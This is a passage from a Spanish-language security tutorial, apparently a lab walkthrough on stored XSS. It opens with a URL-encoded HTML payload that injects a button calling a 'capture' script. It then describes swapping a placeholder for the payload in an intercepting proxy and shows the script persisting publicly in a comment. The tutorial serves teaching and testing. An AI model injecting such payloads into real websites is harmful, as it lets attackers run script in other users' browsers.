22%20%73%74%79%6c%65%3d%22%74%65%78%74%2d%61%6c%69%67%6e%3a%63%65%6e%74%65%72%3b%22%3e%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%62%75%74%74%6f%6e%22%20%6f%6e%63%6c%69%63%6b%3d%22%6a%61%76%61%73%63%72%69%70%74%3a%63%61%70%74%75%72%65%28%74%68%69%73%2e%66%6f%72%6d%29%3b%22%20%76%61%6c%75%65%3d%22%20%20%20%20%20%20%53%75%62%6d%69%74%20%20%20%20%20%20%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%09%09%3c%2f%74%62%6f%64%79%3e%3c%2f%74%61%62%6c%65%3e%0a%09%3c%2f%66%6f%72%6d%3e%0a%3c%2f%64%69%76%3e
```

Por lo que esto reemplazandolo por la palabra `canario`, le dariamos a `Forward` y como podremos ver en la pagina se nos ejecuta el popup.

En el comentario publico se nos quedaria vacio:

<figure><img src="../../../.gitbook/assets/image (95) (1).png" alt=""><figcaption></figcaption></figure>

Pero si volvemos a cargar la pagina volvera aparecer el popup:

<figure><img src="../../../.gitbook/assets/image (96) (1).png" alt=""><figcaption></figcaption></figure>

Si nos vamos al codigo fuente, podremos ver que nuestro codigo se injecto corerctamente:

<figure><img src="../../../.gitbook/assets/image (97) (1).png" alt=""><figcaption></figcaption></figure>

Y esto esta de forma publica, creando asi una persistencia `XSS`.
